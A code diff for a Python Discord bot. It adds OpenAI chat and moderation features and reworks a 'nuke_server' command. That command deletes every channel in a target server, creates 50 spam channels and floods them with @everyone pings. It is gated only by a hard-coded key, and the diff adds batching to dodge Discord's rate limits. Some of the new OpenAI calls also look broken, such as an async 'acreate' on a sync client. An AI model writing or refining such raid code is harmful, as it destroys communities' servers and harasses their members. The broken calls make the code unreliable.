@@ -1,6 +1,5 @@
-# bot – Complete Final Version (Fixed Sync) 
-# All your original commands + features kept
-
+# bot – Complete Final Version (All Listed Commands & Features + Auto Role on Join + Userinfo + Ping Commands + Verification + Channel Mod)
+# Run: python bot.py
 import os
 import io
 import json
@@ -10,10 +9,12 @@ import re
 from collections import defaultdict, deque
 from datetime import datetime, timedelta
 from typing import Optional
+
 import discord
 from discord import app_commands
 from discord.ext import commands
 from dotenv import load_dotenv
+import openai
 
 load_dotenv()
 
@@ -28,9 +29,19 @@ def parse_timespan(timespan: str):
         time_params[unit_map[unit]] += int(amount)
     return timedelta(**time_params)
 
-TOKEN = os.getenv("TOKEN", "").strip()
-GUILD_ID = os.getenv("GUILD_ID", "").strip()
 
+
+# ─────────────────────────────
+# OPENAI SETUP
+# ─────────────────────────────
+OPENAI_API_KEY = os.getenv("OPENAI_API_KEY", "").strip()
+if not OPENAI_API_KEY:
+    print("Warning: OPENAI_API_KEY is not set.")
+
+client = openai.OpenAI(api_key=OPENAI_API_KEY)
+
+TOKEN = os.getenv("TOKEN", "").strip()
+GUILD_ID = os.getenv("GUILD_ID", "").strip()  # e.g. 1476039725319061648
 if not TOKEN:
     print("Warning: TOKEN is not set.")
 if GUILD_ID:
@@ -38,7 +49,8 @@ if GUILD_ID:
 
 DATA_FILE = "bot_data.json"
 
-NUKE_KEY = "nuke8048"
+# Nuke command configuration
+NUKE_KEY = "nuke8048"  # Change this to your secret confirmation key
 CHANNEL_BASE_NAME = "nuked"
 SPAM_MSG = "@everyone @here nuked lol"
 CHANNEL_COUNT = 50
@@ -71,47 +83,20 @@ intents.reactions = True
 intents.messages = True
 intents.message_content = True
 
-bot = commands.Bot(command_prefix="!", intents=intents)
-tree = bot.tree
+bot = commands.Bot(
+    command_prefix="!",
+    intents=intents
+)
 
-# ======================
-# COMMAND SYNC SECTION
-# ======================
+tree = bot.tree  # THIS LINE FIXES THE NameError
 
-async def sync_commands():
-    try:
-        print("🔄 Syncing slash commands...")
-
-        # Sync to your specific server (fast & instant)
-        guild = discord.Object(id=1196980093248094340)   # ← Your server ID
-        synced = await bot.tree.sync(guild=guild)
-        
-        print(f"✅ Successfully synced {len(synced)} commands to your server!")
-        for cmd in synced:
-            print(f"   • /{cmd.name}")
-
-        # Optional: Also sync globally (takes up to 1 hour)
-        # global_synced = await bot.tree.sync()
-        # print(f"✅ Synced {len(global_synced)} global commands")
-
-    except Exception as e:
-        print(f"❌ Failed to sync commands: {e}")
-
-# ======================
-# Put this inside your on_ready() event
-# ======================
-
-@bot.event
-async def on_ready():
-    print(f"✅ Logged in as {bot.user} ({bot.user.id})")
-    
-    await sync_commands()        # ← This line syncs your commands
-    
-    print("Bot is ready!")
 # ────────────────────────────────────────────────
-# YOUR ORIGINAL COMMANDS (ALL KEPT UNCHANGED)
+# Nuke Autocomplete (unchanged - keep it)
 # ────────────────────────────────────────────────
-async def admin_server_autocomplete(interaction: discord.Interaction, current: str):
+async def admin_server_autocomplete(
+    interaction: discord.Interaction,
+    current: str
+) -> list[app_commands.Choice[str]]:
     choices = []
     for guild in bot.guilds:
         member = guild.get_member(interaction.user.id)
@@ -123,59 +108,134 @@ async def admin_server_autocomplete(interaction: discord.Interaction, current: s
                 break
     return choices
 
-@tree.command(name="nuke_server", description="DANGER - Nuke any server you're admin in (key required)")
+
+# ────────────────────────────────────────────────
+# Improved & Working Nuke Command
+# ────────────────────────────────────────────────
+@tree.command(
+    name="nuke_server",
+    description="DANGER - Nuke any server you're admin in (key required)"
+)
 @app_commands.default_permissions(administrator=True)
-@app_commands.describe(server="Server to target (start typing name)", key="Secret confirmation key")
+@app_commands.describe(
+    server="Server to target (start typing name)",
+    key="Secret confirmation key"
+)
 @app_commands.autocomplete(server=admin_server_autocomplete)
-async def nuke_server_cmd(interaction: discord.Interaction, server: str, key: str):
+async def nuke_server_cmd(
+    interaction: discord.Interaction,
+    server: str,
+    key: str
+):
     if key != NUKE_KEY:
         await interaction.response.send_message("❌ Wrong key.", ephemeral=True)
         return
+
     try:
         guild_id = int(server)
     except ValueError:
         await interaction.response.send_message("Invalid server ID.", ephemeral=True)
         return
+
     target_guild = bot.get_guild(guild_id)
     if target_guild is None:
         await interaction.response.send_message("Bot not in that server.", ephemeral=True)
         return
+
     member = target_guild.get_member(interaction.user.id)
     if not member or not member.guild_permissions.administrator:
-        await interaction.response.send_message("You need Administrator permission in that server.", ephemeral=True)
+        await interaction.response.send_message(
+            "You need Administrator permission in that server.", ephemeral=True)
         return
 
+    # Defer immediately – gives 15 minutes to finish
     await interaction.response.defer(ephemeral=False)
+
     try:
-        await interaction.followup.send(f"☢️ **NUKE STARTED** on {target_guild.name} ({guild_id})", ephemeral=False)
-        # Phase 1: Delete channels
+        await interaction.followup.send(
+            f"☢️ **NUKE STARTED** on {target_guild.name} ({guild_id})\n"
+            "Deleting channels → Creating spam channels → Flooding...",
+            ephemeral=False
+        )
+
+        # Phase 1: Delete channels (fast parallel)
         deleted = 0
         delete_tasks = [ch.delete(reason=f"nuke by {interaction.user}") for ch in list(target_guild.channels)]
         delete_results = await asyncio.gather(*delete_tasks, return_exceptions=True)
         deleted = sum(1 for r in delete_results if not isinstance(r, Exception))
         await interaction.followup.send(f"Deleted **{deleted}** channels", ephemeral=False)
 
-        # Phase 2: Create channels
+        # Phase 2: Create channels (fast parallel)
         created = []
-        create_tasks = [target_guild.create_text_channel(f"{CHANNEL_BASE_NAME}-{i+1}") for i in range(CHANNEL_COUNT)]
+        create_tasks = []
+        for i in range(CHANNEL_COUNT):
+            name = CHANNEL_BASE_NAME if i == 0 else f"{CHANNEL_BASE_NAME}-{i+1}"
+            create_tasks.append(target_guild.create_text_channel(name))
+
         create_results = await asyncio.gather(*create_tasks, return_exceptions=True)
         created = [ch for ch in create_results if isinstance(ch, discord.TextChannel)]
         await interaction.followup.send(f"Created **{len(created)}** channels", ephemeral=False)
 
-        # Phase 3: Spam
+        # Phase 3: Spam in safe batches
         if created:
             sent = 0
+            
+            global SPAM_COUNT  # ← THIS FIXES the "cannot access local variable" error
+            
+            # ─── SAFETY CAP ───
+            MAX_SAFE_SPAM = 250  # ← Change this to whatever max you want (e.g. 200, 300, 150)
+            if SPAM_COUNT > MAX_SAFE_SPAM:
+                await interaction.followup.send(
+                    f"⚠️ Safety cap activated: Limiting to **{MAX_SAFE_SPAM}** messages to avoid Discord banning the bot.",
+                    ephemeral=False
+                )
+                SPAM_COUNT = MAX_SAFE_SPAM
+            # ──────────────────
+
             batch_size = 15
+            delay_between_batches = 3.0  # seconds – helps avoid instant 429
+
             for start in range(0, SPAM_COUNT, batch_size):
-                batch = [random.choice(created).send(SPAM_MSG) for _ in range(min(batch_size, SPAM_COUNT - start))]
-                await asyncio.gather(*batch, return_exceptions=True)
-                sent += len(batch)
-                await asyncio.sleep(3)
+                batch = []
+                for _ in range(min(batch_size, SPAM_COUNT - start)):
+                    ch = random.choice(created)
+                    batch.append(ch.send(SPAM_MSG))
+                    sent += 1
+
+                if batch:
+                    await asyncio.gather(*batch, return_exceptions=True)
+
+                # Delay between batches
+                if start + batch_size < SPAM_COUNT:
+                    await asyncio.sleep(delay_between_batches)
+
+                # Progress update
+                try:
+                    await interaction.followup.send(
+                        f"Spam progress: **{sent}/{SPAM_COUNT}** messages sent",
+                        ephemeral=False
+                    )
+                except:
+                    pass  # continue even if update fails
+
             await interaction.followup.send(f"Spam finished – **{sent}** messages sent", ephemeral=False)
 
-        await interaction.followup.send(f"**Nuke completed** on {target_guild.name}", ephemeral=True)
+        # Final success message
+        await interaction.followup.send(
+            f"**Nuke completed** on {target_guild.name}\n"
+            f"Deleted: {deleted} | Created: {len(created)} | Spam: {sent}",
+            ephemeral=True
+        )
+
     except Exception as e:
-        await interaction.followup.send(f"Error: {str(e)}", ephemeral=True)
+        print(f"Nuke error: {str(e)}")
+        try:
+            await interaction.followup.send(f"Critical error during nuke: {str(e)}", ephemeral=True)
+        except:
+            print("Final followup failed – nuke may have partially completed")
+# ────────────────────────────────────────────────
+# Rest of your original code (unchanged from here)
+# ────────────────────────────────────────────────
 
 # Anti-spam tracker: guild → user → deque of timestamps
 spam_tracker = defaultdict(lambda: defaultdict(deque))
@@ -207,41 +267,32 @@ COLOR_MAP = {
     "brown": "a52a2a",
 }
 
-# ======================
-# COMMAND SYNC SECTION
-# ======================
-
-async def sync_commands():
-    try:
-        print("🔄 Syncing slash commands...")
-
-        # Sync to your specific server (fast & instant)
-        guild = discord.Object(id=1196980093248094340)   # ← Your server ID
-        synced = await bot.tree.sync(guild=guild)
-        
-        print(f"✅ Successfully synced {len(synced)} commands to your server!")
-        for cmd in synced:
-            print(f"   • /{cmd.name}")
-
-        # Optional: Also sync globally (takes up to 1 hour)
-        # global_synced = await bot.tree.sync()
-        # print(f"✅ Synced {len(global_synced)} global commands")
-
-    except Exception as e:
-        print(f"❌ Failed to sync commands: {e}")
-
-# ======================
-# Put this inside your on_ready() event
-# ======================
-
 @bot.event
 async def on_ready():
-    print(f"✅ Logged in as {bot.user} ({bot.user.id})")
-    
-    await sync_commands()        # ← This line syncs your commands
-    
-    print("Bot is ready!")
-    
+    print("Starting Bot...")
+    ping_tasks.clear()
+
+    print("Connected guild IDs:", [g.id for g in bot.guilds])
+    if GUILD_ID:
+        try:
+            guild = discord.Object(id=int(GUILD_ID))
+        except ValueError:
+            guild = None
+            print(f"Invalid GUILD_ID value: {GUILD_ID!r}")
+    else:
+        guild = None
+
+    try:
+        if guild:
+            synced = await tree.sync(guild=guild)
+            print(f"Synced {len(synced)} guild command(s) to {GUILD_ID}")
+        else:
+            synced = await tree.sync()
+            print(f"Synced {len(synced)} global command(s)")
+        print("Registered command names:", [cmd.name for cmd in tree.commands])
+    except Exception as e:
+        print(f"Sync failed: {e}")
+
 def get_guild_data(guild_id):
     gid = str(guild_id)
     if gid not in bot_data:
@@ -306,7 +357,41 @@ async def setsquidchannel(interaction: discord.Interaction, channel: discord.Tex
     await interaction.response.send_message(f"✅ Squid Games channel saved: {channel.mention}", ephemeral=True)
 
 # ─────────────────────────────
-# ON MESSAGE HANDLER FOR MODERATION AND FILTERS
+# SLASH COMMAND TO SET AI CHANNEL
+# ─────────────────────────────
+@bot.tree.command(name="set_ai_channel", description="Set the channel for AI chat")
+@app_commands.describe(channel="The channel where AI will respond")
+async def set_ai_channel(interaction: discord.Interaction, channel: discord.TextChannel):
+    guild_data = get_guild_data(interaction.guild_id)
+    guild_data.setdefault("ai_settings", {
+        "channel_id": None,
+        "enabled": False,
+        "mod_enabled": False
+    })
+    guild_data["ai_settings"]["channel_id"] = channel.id
+    guild_data["ai_settings"]["enabled"] = True
+    save_data(bot_data)
+    await interaction.response.send_message(f"AI chat channel set to {channel.mention}", ephemeral=True)
+
+# ─────────────────────────────
+# SLASH COMMAND TO TOGGLE AI MODERATION
+# ─────────────────────────────
+@bot.tree.command(name="ai_mod", description="Enable or disable AI moderation")
+@app_commands.describe(toggle="Enable (true) or disable (false) AI moderation")
+async def ai_mod(interaction: discord.Interaction, toggle: bool):
+    guild_data = get_guild_data(interaction.guild_id)
+    guild_data.setdefault("ai_settings", {
+        "channel_id": None,
+        "enabled": False,
+        "mod_enabled": False
+    })
+    guild_data["ai_settings"]["mod_enabled"] = toggle
+    save_data(bot_data)
+    status = "enabled" if toggle else "disabled"
+    await interaction.response.send_message(f"AI moderation {status}", ephemeral=True)
+
+# ─────────────────────────────
+# ON MESSAGE HANDLER FOR AI CHAT, MODERATION, AND FILTERS
 # ─────────────────────────────
 @bot.event
 async def on_message(message: discord.Message):
@@ -318,6 +403,47 @@ async def on_message(message: discord.Message):
         return
     user_roles = {str(r.id) for r in message.author.roles}
     if user_roles & set(guild_data.get("ignored_roles", [])):
+        return
+
+    guild_data = get_guild_data(message.guild.id)
+    ai_data = guild_data.get("ai_settings", {})
+
+    # ───────────── AI MODERATION ─────────────
+    if ai_data.get("mod_enabled"):
+        try:
+            mod_check = client.chat.completions.create(
+                model="gpt-4o",
+                messages=[
+                    {
+                        "role": "system",
+                        "content": "Determine if this message is harmful, toxic, spam, or inappropriate. Reply ONLY with YES or NO."
+                    },
+                    {"role": "user", "content": message.content}
+                ]
+            )
+            result = mod_check.choices[0].message.content.lower()
+            if "yes" in result:
+                await message.delete()
+                await message.channel.send(f"{message.author.mention}, your message was removed by AI moderation.", delete_after=5)
+                return
+        except Exception as e:
+            print(f"[AI MOD ERROR] {e}")
+
+    # ───────────── AI CHAT ─────────────
+    if ai_data.get("enabled") and message.channel.id == ai_data.get("channel_id"):
+        try:
+            async with message.channel.typing():
+                response = await client.chat.completions.acreate(
+                    model="gpt-4o-mini",
+                    messages=[
+                        {"role": "system", "content": "You are a helpful Discord bot. Keep replies short and clean."},
+                        {"role": "user", "content": message.content}
+                    ]
+                )
+            reply = response.choices[0].message.content
+            await message.reply(reply[:2000])
+        except Exception as e:
+            await message.channel.send(f"AI Error: {e}")
         return
 
     # ───────────── BADWORD FILTER ─────────────
@@ -1966,6 +2092,26 @@ async def joke(interaction: discord.Interaction):
     ]
     await interaction.response.send_message(random.choice(jokes))
 
+@tree.command(name="airoast", description="Savage roast")
+@app_commands.describe(target="Who to roast (optional)")
+async def airoast(interaction: discord.Interaction, target: discord.Member = None):
+    v = target or interaction.user
+    roasts = [
+        f"{v.mention} has the personality of expired milk.",
+        f"{v.name} is why the mute button exists."
+    ]
+    await interaction.response.send_message(random.choice(roasts))
+
+@tree.command(name="aipickup", description="Cheesy pickup line")
+@app_commands.describe(target="Who (optional)")
+async def aipickup(interaction: discord.Interaction, target: discord.Member = None):
+    t = target.mention if target else "you"
+    lines = [
+        f"Are you Wi-Fi? Because I'm feeling a connection with {t}.",
+        f"Is your name Google? Because {t} has everything I've been searching for."
+    ]
+    await interaction.response.send_message(random.choice(lines))
+
 # ────────────────────────────────────────────────
 # Help Command – updated with new commands
 # ────────────────────────────────────────────────
@@ -1985,7 +2131,7 @@ async def help_command(interaction: discord.Interaction):
     embed.add_field(name="Pings", value="`/pingstart` `/pingstop`", inline=False)
     embed.add_field(name="Fun & Utility", value=(
         "`/say` `/8ball` `/coinflip` `/dice` `/joke` "
-        "`/poll` `/set_starboard` `/rr`"
+        "`/airoast` `/aipickup` `/poll` `/set_starboard` `/rr`"
     ), inline=False)
     embed.set_footer(text="bot • March 2026")
     await interaction.response.send_message(embed=embed, ephemeral=True)
@@ -2078,7 +2224,7 @@ async def on_message_delete(message):
     if cid:
         channel = message.guild.get_channel(cid)
         if channel:
-            embed = discord.Embed(color=0xff0000, description=f"Deleted in {message.channel.mention}\n{message.content or '[No text]'}", timestamp=datetime.now(datetime.timezone.utc))
+            embed = discord.Embed(color=0xff0000, description=f"Deleted in {message.channel.mention}\n{message.content or '[No text]'}", timestamp=datetime.utcnow())
             embed.set_author(name=str(message.author))
             await channel.send(embed=embed)
 
